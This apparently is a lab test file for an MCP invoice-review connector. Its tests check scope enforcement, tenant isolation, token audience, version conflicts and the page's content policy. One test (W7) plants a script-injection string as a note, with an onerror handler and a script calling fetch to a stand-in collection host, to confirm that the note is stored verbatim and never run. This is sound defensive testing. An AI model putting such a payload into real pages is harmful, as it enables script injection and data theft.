// The review workspace connector's tests (Lab 20b, Task 3): written before the page. In process, with
// test tokens, against the dev database as review_writer. Each test removes the notes it wrote.
import { after, before, test } from "node:test";
import assert from "node:assert/strict";
import pg from "pg";
import { Client, StreamableHTTPClientTransport } from "@modelcontextprotocol/client";
import { createConnector } from "../src/http.ts";
import { poolConnect, reviewDatabase } from "../src/db.ts";
import type { AuditLine } from "../src/server.ts";
import { fakeJwks, ISSUER, JWKS_URL, sign } from "../../ap-ts/test/tokens.ts";

const RESOURCE = "http://127.0.0.1:8757/mcp";
const AP_RESOURCE = "http://127.0.0.1:8717/mcp";
for (const v of ["DATABASE_URL_REVIEW_WRITER", "DATABASE_URL_LOADER"])
  if (!process.env[v]) throw new Error(`${v} is not set: run npm run db:migrate and npm run db:passwords (Lab 20b, Task 1)`);
const pool = poolConnect(process.env.DATABASE_URL_REVIEW_WRITER!);
const lines: AuditLine[] = [];
const keys = fakeJwks();
const copy = createConnector({
  db: reviewDatabase(pool.connect), issuer: ISSUER, resource: RESOURCE, keys: { jwksUrl: JWKS_URL, fetch: keys.fetch },
  asOf: "2027-03-30", log: (l) => lines.push(l),
});
const person = (sub: string, name: string, tenant: string, scope: string, aud = RESOURCE) =>
  sign({ sub, tenant, scope, aud, ...({ name } as object) });
const luis = await person("u_test_luis", "Luis Moreno", "org_cedar", "review:read review:write");
const priya = await person("u_test_priya", "Priya Shah", "org_cedar", "review:read review:write");
const marco = await person("u_test_marco", "Marco Diaz", "org_cedar", "review:read");
const ana = await person("u_test_ana", "Ana Morales", "org_brightline", "review:read review:write");

async function connect(token: string) {
  const client = new Client({ name: "review-tests", version: "1.0.0" }, { versionNegotiation: { mode: { pin: "2026-07-28" } } });
  await client.connect(new StreamableHTTPClientTransport(new URL(RESOURCE), {
    requestInit: { headers: { Authorization: `Bearer ${token}` } }, fetch: (url, init) => copy.fetch(new Request(url, init)),
  }));
  return client;
}
const text = (r: { content?: unknown }) => (r.content as { text: string }[])[0].text;

/** Remove the notes these tests wrote, as the loader, one company at a time. */
async function clean() {
  const c = new pg.Client({ connectionString: process.env.DATABASE_URL_LOADER });
  await c.connect();
  for (const tenant of ["org_cedar", "org_brightline"]) {
    await c.query("BEGIN");
    await c.query("SELECT set_config('app.tenant_id', $1, true)", [tenant]);
    await c.query("DELETE FROM review_notes WHERE tenant_id = $1 AND saved_by LIKE 'u_test_%'", [tenant]);
    await c.query("COMMIT");
  }
  await c.end();
}
before(clean);
after(async () => { await clean(); await pool.end(); });

test("five tools; save_review_note is offered to the page only; the page has the standard's type and no outside address", async () => {
  const c = await connect(luis);
  const { tools } = await c.listTools();
  assert.deepEqual(tools.map((t) => t.name).sort(), ["export_review", "get_review_note", "open_review_workspace", "review_list", "save_review_note"]);
  const ui = (name: string) => (tools.find((t) => t.name === name)!._meta as Record<string, any>).ui;
  assert.equal(ui("open_review_workspace").resourceUri, "ui://brightline/review-workspace.html");
  assert.deepEqual(ui("save_review_note").visibility, ["app"]);
  assert.equal(tools.find((t) => t.name === "save_review_note")!.annotations?.readOnlyHint, false);
  const page = await c.readResource({ uri: "ui://brightline/review-workspace.html" });
  const content = page.contents[0] as { mimeType: string; text: string; _meta: any };
  assert.equal(content.mimeType, "text/html;profile=mcp-app");
  assert.deepEqual(content._meta.ui.csp, { connectDomains: [], resourceDomains: [] });
  assert.ok(!/<script[^>]+src=/.test(content.text), "the page loads no script from anywhere");
  assert.ok(!/innerHTML/.test(content.text.slice(content.text.indexOf("const { App"))), "the page never writes data as page code");
  await c.close();
});

test("open_review_workspace answers in text: Cedar Ridge's 16 open invoices, $21,329.00, 14 overdue on March 30, 2027", async () => {
  const c = await connect(luis);
  const r = await c.callTool({ name: "open_review_workspace", arguments: {} });
  assert.match(text(r), /^Cedar Ridge Supply's month-end review, as of 2027-03-30: 16 open invoices, \$21,329\.00 in all, 14 of them overdue\./);
  const sc = r.structuredContent as any;
  assert.equal(sc.invoices.length, 16);
  assert.ok(sc.invoices.every((i: any) => !("bank_account_last4" in i)), "the bank account ending is on the never list");
  await c.close();
});

test("W1: Luis saves a note as version 1, and the audit line names him", async () => {
  const c = await connect(luis);
  lines.length = 0;
  const r = await c.callTool({ name: "save_review_note", arguments: { invoice_number: "INV-6201", note: "Matches PO-6101. Approved for payment run.", status: "reviewed", version: 0 } });
  assert.equal(r.isError, undefined, text(r));
  assert.equal((r.structuredContent as any).version, 1);
  assert.deepEqual(lines.map((l) => [l.tool, l.person, l.company, l.outcome]), [["save_review_note", "u_test_luis", "org_cedar", "ok"]]);
  const got = await c.callTool({ name: "get_review_note", arguments: { invoice_number: "INV-6201" } });
  assert.equal((got.structuredContent as any).note.saved_by_name, "Luis Moreno");
  await c.close();
});

test("W2: Marco, an auditor, is refused before the tool runs: 403, review:write named", async () => {
  const res = await copy.fetch(new Request(RESOURCE, {
    method: "POST", headers: { authorization: `Bearer ${marco}`, "content-type": "application/json", accept: "application/json, text/event-stream",
      "mcp-protocol-version": "2026-07-28", "mcp-method": "tools/call", "mcp-name": "save_review_note" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "save_review_note",
      arguments: { invoice_number: "INV-6202", note: "x", status: "open", version: 0 },
      _meta: { "io.modelcontextprotocol/protocolVersion": "2026-07-28", "io.modelcontextprotocol/clientCapabilities": {} } } }),
  }));
  assert.equal(res.status, 403);
  assert.match(res.headers.get("www-authenticate") ?? "", /insufficient_scope.*save_review_note needs review:read review:write\. Your role in Cedar Ridge Supply does not include it\./);
});

test("W3: Priya, signed in for Cedar Ridge, saves on Brightline's INV-8301: not found", async () => {
  const c = await connect(priya);
  const r = await c.callTool({ name: "save_review_note", arguments: { invoice_number: "INV-8301", note: "x", status: "open", version: 0 } });
  assert.equal(r.isError, true);
  assert.equal(text(r), "Invoice INV-8301 was not found among Cedar Ridge Supply's open invoices.");
  await c.close();
});

test("W4: two saves of the same version: the second is refused and names who saved first, and when", async () => {
  const l = await connect(luis), p = await connect(priya);
  const first = await l.callTool({ name: "save_review_note", arguments: { invoice_number: "INV-6207", note: "Waiting on the vendor's credit note.", status: "follow up", version: 0 } });
  assert.equal((first.structuredContent as any).version, 1);
  const second = await p.callTool({ name: "save_review_note", arguments: { invoice_number: "INV-6207", note: "Paid in full, close it.", status: "reviewed", version: 0 } });
  assert.equal(second.isError, true);
  assert.match(text(second), /^This note changed after you opened it: Luis Moreno saved version 1 at \d{4}-\d{2}-\d{2} \d{2}:\d{2} UTC\. Your text was not saved\. Reload and compare, then save again\.$/);
  const now = await p.callTool({ name: "get_review_note", arguments: { invoice_number: "INV-6207" } });
  assert.equal((now.structuredContent as any).note.note, "Waiting on the vendor's credit note.");
  await l.close(); await p.close();
});

test("W7: a note that holds page code comes back as the same characters, never changed or run here", async () => {
  const c = await connect(luis);
  const planted = 'Check <img src=x onerror="alert(1)"> and <script>fetch("https://collect.example.net")</script> | pipe';
  const s = await c.callTool({ name: "save_review_note", arguments: { invoice_number: "INV-6211", note: planted, status: "open", version: 0 } });
  assert.equal(s.isError, undefined, text(s));
  const got = await c.callTool({ name: "get_review_note", arguments: { invoice_number: "INV-6211" } });
  assert.equal((got.structuredContent as any).note.note, planted);
  const md = text(await c.callTool({ name: "export_review", arguments: {} }));
  assert.ok(md.includes("| INV-6211 |") && md.includes("\\| pipe"), "a pipe in a note cannot break the Markdown table");
  await c.close();
});

test("W8: Ana, for Brightline, sees none of Cedar Ridge's notes", async () => {
  const c = await connect(ana);
  const r = await c.callTool({ name: "review_list", arguments: {} });
  const rows = (r.structuredContent as any).invoices as any[];
  assert.equal(rows.length, 13);
  assert.ok(rows.every((i) => i.saved_by_name === null || !["Luis Moreno", "Priya Shah"].includes(i.saved_by_name)));
  assert.ok(!rows.some((i) => ["INV-6201", "INV-6207", "INV-6211"].includes(i.invoice_number)));
  await c.close();
});

test("W9: Luis's token for the AP connector is refused here, because it was made for another address", async () => {
  const apToken = await person("u_test_luis", "Luis Moreno", "org_cedar", "review:read review:write", AP_RESOURCE);
  const res = await copy.fetch(new Request(RESOURCE, {
    method: "POST", headers: { authorization: `Bearer ${apToken}`, "content-type": "application/json", accept: "application/json, text/event-stream" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/list", params: {} }),
  }));
  assert.equal(res.status, 401);
  assert.match(res.headers.get("www-authenticate") ?? "", /Sign in to use the Brightline review workspace\./);
});

test("review_list filters: overdue, one vendor, one status", async () => {
  const c = await connect(luis);
  const list = async (args: Record<string, unknown>) => ((await c.callTool({ name: "review_list", arguments: args })).structuredContent as any).invoices as any[];
  assert.equal((await list({ overdue: true })).length, 14);
  assert.deepEqual((await list({ vendor_id: "V102" })).map((i) => i.invoice_number), ["INV-6207", "INV-6219"]);
  assert.deepEqual((await list({ status: "reviewed" })).map((i) => i.invoice_number), ["INV-6201"]);
  await c.close();
});

test("rule 3: a tool input that names a company is refused, before any tool runs", async () => {
  const c = await connect(luis);
  const r = await c.callTool({ name: "review_list", arguments: { company: "org_brightline" } as never });
  assert.equal(r.isError, true);
  assert.equal(text(r), "Unknown input company. The company comes only from your sign-in, never from a tool input.");
  await c.close();
});
